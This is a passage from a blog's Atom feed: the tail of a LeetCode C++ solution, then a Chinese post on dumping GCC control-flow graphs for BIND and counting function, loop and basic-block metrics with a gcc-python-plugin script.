class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;vector&amp;lt;string&amp;gt; &lt;span class=&quot;title&quot;&gt;alertNames&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;string&amp;gt;&amp;amp; keyName, vector&amp;lt;string&amp;gt;&amp;amp; keyTime)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        map&amp;lt;string, priority_queue&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt; hour_count;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = keyName.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; h = (keyTime[i][&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]-&lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;)*&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; + keyTime[i][&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] - &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;, m = (keyTime[i][&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] - &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;) * &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; + keyTime[i][&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;] - &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            hour_count[keyName[i]].&lt;span class=&quot;built_in&quot;&gt;push&lt;/span&gt;(h*&lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;+m);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        vector&amp;lt;string&amp;gt; warning_list;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;auto&lt;/span&gt; ite = hour_count.&lt;span class=&quot;built_in&quot;&gt;begin&lt;/span&gt;(); ite != hour_count.&lt;span class=&quot;built_in&quot;&gt;end&lt;/span&gt;(); ite++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(len &amp;lt;= &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; a, b, c;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            a = ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;top&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;pop&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            b = ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;top&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;pop&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            c = ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;top&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;pop&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; warn = a - c &amp;lt;= &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(!warn &amp;amp;&amp;amp; !ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;empty&lt;/span&gt;()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                a = b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                b = c;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                c = ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;top&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ite-&amp;gt;second.&lt;span class=&quot;built_in&quot;&gt;pop&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                warn = a - c &amp;lt;= &lt;span class=&quot;number&quot;&gt;60&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(warn) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                warning_list.&lt;span class=&quot;built_in&quot;&gt;push_back&lt;/span&gt;(ite-&amp;gt;first);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; warning_list;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;2331-计算布尔二叉树的值&quot;&gt;&lt;a href=&quot;#2331-计算布尔二叉树的值&quot; class=&quot;headerlink&quot; title=&quot;2331. 计算布尔二叉树的值&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/evaluate-boolean-binary-tree/&quot;&gt;2331. 计算布尔二叉树的值&lt;/a&gt;&lt;/h2&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>CFG生成＆定位BB</title>
    <link href="https://jingtianer.github.io/home/2023/02/15/%E7%BB%84%E4%BC%9A/cfg%E7%94%9F%E6%88%90%EF%BC%86%E5%AE%9A%E4%BD%8DBB/"/>
    <id>https://jingtianer.github.io/home/2023/02/15/%E7%BB%84%E4%BC%9A/cfg%E7%94%9F%E6%88%90%EF%BC%86%E5%AE%9A%E4%BD%8DBB/</id>
    <published>2023-02-15T04:15:37.000Z</published>
    <updated>2023-02-21T08:35:00.450Z</updated>
    
    <content type="html"><![CDATA[<h2 id="cfg生成"><a href="#cfg生成" class="headerlink" title="cfg生成"></a>cfg生成</h2><ul><li><p>使用afl编译，添加以下参数<code>-fdump-tree-all</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=<span class="string">&#x27;afl-gcc -fdump-tree-all&#x27;</span></span><br><span class="line"><span class="built_in">export</span> CXX=<span class="string">&#x27;afl-g++ -fdump-tree-all&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>或使用gcc编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=<span class="string">&#x27;gcc -fdump-tree-all&#x27;</span></span><br><span class="line"><span class="built_in">export</span> CXX=<span class="string">&#x27;g++ -fdump-tree-all&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>编译完成后，进入<code>./bin/named</code>发现生成了<code>cfg</code>文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tt@ubuntu:~/Desktop/dnsenv/bind-9.18.1/bin/named$ find *.cfg</span><br><span class="line">builtin.c.011t.cfg</span><br><span class="line">config.c.011t.cfg</span><br><span class="line">control.c.011t.cfg</span><br><span class="line">controlconf.c.011t.cfg</span><br><span class="line">dlz_dlopen_driver.c.011t.cfg</span><br><span class="line">fuzz.c.011t.cfg</span><br><span class="line">log.c.011t.cfg</span><br><span class="line">logconf.c.011t.cfg</span><br><span class="line">main.c.011t.cfg</span><br><span class="line">os.c.011t.cfg</span><br><span class="line">server.c.011t.cfg</span><br><span class="line">statschannel.c.011t.cfg</span><br><span class="line">tkeyconf.c.011t.cfg</span><br><span class="line">transportconf.c.011t.cfg</span><br><span class="line">tsigconf.c.011t.cfg</span><br><span class="line">zoneconf.c.011t.cfg</span><br></pre></td></tr></table></figure></li></ul><h3 id="对于gcc版本足够高的情况"><a href="#对于gcc版本足够高的情况" class="headerlink" title="对于gcc版本足够高的情况"></a>对于gcc版本足够高的情况</h3><p>（我用gcc 11.3.0进行测试），在编译时加入以下参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-fdump-tree-all-graph</span><br></pre></td></tr></table></figure><blockquote><p>可以直接产生<code>.dot</code>文件（graph description language）</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@tt-surfacepro6:~/tmp<span class="comment"># find *.dot</span></span><br><span class="line">a-test.c.015t.cfg.dot</span><br><span class="line">a-test.c.017t.ompexp.dot</span><br><span class="line">a-test.c.018t.warn-printf.dot</span><br><span class="line">a-test.c.022t.fixup_cfg1.dot</span><br><span class="line">a-test.c.023t.ssa.dot</span><br><span class="line">a-test.c.027t.fixup_cfg2.dot</span><br><span class="line">a-test.c.028t.local-fnsummary1.dot</span><br><span class="line">a-test.c.029t.einline.dot</span><br><span class="line">a-test.c.051t.release_ssa.dot</span><br><span class="line">a-test.c.052t.local-fnsummary2.dot</span><br><span class="line">a-test.c.092t.fixup_cfg3.dot</span><br><span class="line">a-test.c.097t.adjust_alignment.dot</span><br><span class="line">a-test.c.233t.veclower.dot</span><br><span class="line">a-test.c.234t.cplxlower0.dot</span><br><span class="line">a-test.c.236t.switchlower_O0.dot</span><br><span class="line">a-test.c.243t.isel.dot</span><br><span class="line">a-test.c.244t.optimized.dot</span><br></pre></td></tr></table></figure><p>使用以下命令可以将其转化成图片</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dot -Tpng &lt;文件名&gt; -O</span><br></pre></td></tr></table></figure><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><ul><li>Graphviz</li></ul><h3 id="gcc版本较低的情况下，对控制流图可视化"><a href="#gcc版本较低的情况下，对控制流图可视化" class="headerlink" title="gcc版本较低的情况下，对控制流图可视化"></a>gcc版本较低的情况下，对控制流图可视化</h3><ul><li><p>可以使用<code>gcc-python-plugin</code>获取基于gimple的控制流</p></li><li><p>参考<a href="https://gcc-python-plugin.readthedocs.io/en/latest/index.html">官方</a>教程编译安装<code>gcc-python-plugin</code></p></li><li><p>编写生成图片python的脚本</p></li><li><p>编译时使用该脚本，命令如下</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=<span class="string">&#x27;gcc -fplugin=/home/tt/Desktop/dnsenv/gcc-python-plugin/python.so -fplugin-arg-python-script=/home/tt/Desktop/dnsenv/gcc-python-plugin/examples/show-gimple.py&#x27;</span></span><br><span class="line"><span class="built_in">export</span> CXX=<span class="string">&#x27;g++ -fplugin=/home/tt/Desktop/dnsenv/gcc-python-plugin/python.so -fplugin-arg-python-script=/home/tt/Desktop/dnsenv/gcc-python-plugin/examples/show-gimple.py&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>这个工具有点问题，需要简单修改一下，在修改文件<code>gccutils/__init__.py</code>的<code>invoke_dot</code>函数为如下内容</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">invoke_dot</span>(<span class="params">dot, name=<span class="string">&#x27;test&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">        fmt = <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># SVG generation seems to work, but am seeing some text-width issues</span></span><br><span class="line">        <span class="comment"># with rendering of the SVG  by eog and firefox on this machine (though</span></span><br><span class="line">        <span class="comment"># not chromium).</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Looks like X coordinates allocated by graphviz don&#x27;t contain quite</span></span><br><span class="line">        <span class="comment"># enough space for the &lt;text&gt; elements.</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Presumably a font selection/font metrics issue</span></span><br><span class="line">        fmt = <span class="string">&#x27;svg&#x27;</span></span><br><span class="line">    filename = <span class="string">&#x27;%s.%s&#x27;</span> % (name, fmt)</span><br><span class="line">    p = Popen([<span class="string">&#x27;dot&#x27;</span>, <span class="string">&#x27;-T%s&#x27;</span> % fmt, <span class="string">&#x27;-o&#x27;</span>, filename],</span><br><span class="line">              stdin=PIPE)</span><br><span class="line">    p.communicate(dot.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#p = Popen([&#x27;xdg-open&#x27;, filename])</span></span><br><span class="line">    <span class="comment">#p.communicate()</span></span><br></pre></td></tr></table></figure><blockquote><p>不过这个办法编译过程中还是出现dot崩溃等问题</p></blockquote><ul><li>在<code>bin/named</code>下生成了大量图片，如下图所示<br><img src="https://github.com/jingtianer/home/blob/gh-pages/images/gcc_python_plugin_show_gimple.png?raw=true" alt="gcc-py-plugin-show-gimple"></li></ul><h4 id="利用gcc-python-plugin分析代码"><a href="#利用gcc-python-plugin分析代码" class="headerlink" title="利用gcc-python-plugin分析代码"></a>利用gcc-python-plugin分析代码</h4><ul><li>通过阅读<code>gccutils/__init__.py</code>下的代码，可以得到知道获取cfg的<code>edge</code>, <code>basic blocks</code>的方法</li></ul><ol><li>首先需要继承<code>gcc.GimplePass</code>并实现其中的<code>execute</code>函数<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ShowGimple</span>(gcc.GimplePass):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, fun</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li>在<code>execute</code>中，通过<code>fun.cfg</code>可以获得函数的控制流图</li><li><code>cfg</code>对象中的域<code>basic_blocks</code>可获得基本块</li><li>通过基本块<code>basic_blocks</code>的<code>succs</code>域可获得每个block后继的<code>edge</code></li></ol><ul><li>关于其更详细的介绍可以参看<a href="https://gcc-python-plugin.readthedocs.io/en/latest/cfg.html">官方文档</a></li></ul><h3 id="使用IDA绘制"><a href="#使用IDA绘制" class="headerlink" title="使用IDA绘制"></a>使用<a href="https://www.idapro.net.cn/chanpin.html?target=home">IDA</a>绘制</h3><ul><li>下载安装ida</li><li>编译bind</li><li>用ida对bind二进制反汇编，并可以得到其cfg</li></ul><h2 id="根据函数定位BB"><a href="#根据函数定位BB" class="headerlink" title="根据函数定位BB"></a>根据函数定位BB</h2><p>在<code>gcc-python-plugin</code>中，通过获取bb，可以获取到其中用<code>gcc Gimple</code>表示的<code>statement</code>。其中一类语句为<code>gcc.GimpleCall</code>，其中的<code>fn</code>域表示该语句所调用的函数。</p><blockquote><p>通过以上方法，可以参考<code>gccutils</code>和官方的<code>examples</code>中的代码实现根据函数定位其所在的BB</p></blockquote><h2 id="初步实现"><a href="#初步实现" class="headerlink" title="初步实现"></a>初步实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gcc</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DnsPlugin</span>(gcc.GimplePass):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, funcList, name=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="built_in">super</span>(DnsPlugin, self).__init__(name=name)</span><br><span class="line">        self.funclist = funcList</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stmt_filter</span>(<span class="params">self, bb</span>):</span><br><span class="line">        filtered_funcs = []</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bb.phi_nodes, <span class="built_in">list</span>):</span><br><span class="line">            <span class="keyword">for</span> _, phi <span class="keyword">in</span> <span class="built_in">enumerate</span>(bb.phi_nodes):</span><br><span class="line">                <span class="comment"># phony function</span></span><br><span class="line">                expr, _ = phi.args <span class="comment"># expr, edge</span></span><br><span class="line">                funcName = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(expr, gcc.Constant):</span><br><span class="line">                    funcName = <span class="built_in">str</span>(expr)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(expr, gcc.SsaName):</span><br><span class="line">                    funcName = <span class="built_in">str</span>(expr.def_stmt)</span><br><span class="line">                <span class="keyword">if</span> funcName <span class="keyword">in</span> self.funclist:</span><br><span class="line">                    filtered_funcs.append(funcName)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bb.gimple, <span class="built_in">list</span>) <span class="keyword">and</span> bb.gimple != []:</span><br><span class="line">            <span class="keyword">for</span> _, stmt <span class="keyword">in</span> <span class="built_in">enumerate</span>(bb.gimple):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(stmt, gcc.GimpleCall):</span><br><span class="line">                    funcName = <span class="built_in">str</span>(stmt.fn)</span><br><span class="line">                    <span class="keyword">if</span> funcName <span class="keyword">in</span> self.funclist:</span><br><span class="line">                        filtered_funcs.append(funcName)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> SyntaxError(<span class="string">&quot;gimple syntax invalid!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> filtered_funcs</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, fun</span>):</span><br><span class="line">        FUNC, LOOP, BB = <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> fun <span class="keyword">and</span> fun.cfg:</span><br><span class="line">            self.cfg = fun.cfg</span><br><span class="line">            <span class="keyword">for</span> block <span class="keyword">in</span> self.cfg.basic_blocks:</span><br><span class="line">                <span class="keyword">for</span> edge <span class="keyword">in</span> block.succs:</span><br><span class="line">                    <span class="keyword">if</span> self.is_back_edge(edge):</span><br><span class="line">                        LOOP+=<span class="number">1</span></span><br><span class="line">                FUNCi = <span class="built_in">len</span>(self.stmt_filter(block))</span><br><span class="line">                <span class="keyword">if</span> FUNCi &gt; <span class="number">0</span>:</span><br><span class="line">                    BB+=<span class="number">1</span></span><br><span class="line">                FUNC += FUNCi</span><br><span class="line">        invoke_dns([FUNC, LOOP, BB], name=fun.decl.name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_back_edge</span>(<span class="params">self, edge</span>):</span><br><span class="line">        dest_block, src_block = edge.dest, edge.src</span><br><span class="line">        <span class="comment"># 图很大的话用bfs更好吧</span></span><br><span class="line">        self.visited = [<span class="literal">False</span>] * <span class="built_in">len</span>(self.cfg.basic_blocks)</span><br><span class="line">        index_dest, index_src = dest_block.index, src_block.index</span><br><span class="line">        <span class="keyword">return</span> self.dfs(index_dest, index_src) </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">self, node, target</span>):</span><br><span class="line">        <span class="keyword">if</span> node == target:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        ret = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> edge <span class="keyword">in</span> self.gcc.basic_blocks[node].succs:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.visited[edge.dest.index]:</span><br><span class="line">                self.visited[edge.dest.index] = <span class="literal">True</span></span><br><span class="line">                ret = ret <span class="keyword">or</span> self.dfs(edge.dest.index, target)</span><br><span class="line">                <span class="keyword">if</span> ret:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">ps = DnsPlugin([], name=<span class="string">&#x27;dnsplugin&#x27;</span>)</span><br><span class="line">ps.register_after(<span class="string">&#x27;cfg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invoke_dns</span>(<span class="params">data, name</span>):</span><br><span class="line">    <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line">    filename = <span class="string">&#x27;%s.%s&#x27;</span> % (name, <span class="string">&quot;dnsdat&quot;</span>)</span><br><span class="line">    p = Popen([<span class="string">&#x27;tee&#x27;</span>, <span class="string">&quot;%s&quot;</span> % filename],</span><br><span class="line">             stdin=PIPE)</span><br><span class="line">    p.communicate(data.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br></pre></td></tr></table></figure><blockquote><p>对论文中提到的三个公式<code>FUNC</code>,<code>LOOP</code>,<code>BB</code>进行了统计</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;cfg生成&quot;&gt;&lt;a href=&quot;#cfg生成&quot; class=&quot;headerlink&quot; title=&quot;cfg生成&quot;&gt;&lt;/a&gt;cfg生成&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;使用afl编译，添加以下参数&lt;code&gt;-fdump-tree-all&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CC=&lt;span class=&quot;string&quot;&gt;&amp;#x27;afl-gcc -fdump-tree-all&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CXX=&lt;span class=&quot;string&quot;&gt;&amp;#x27;afl-g++ -fdump-tree-all&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;或使用gcc编译&lt;/p&gt;
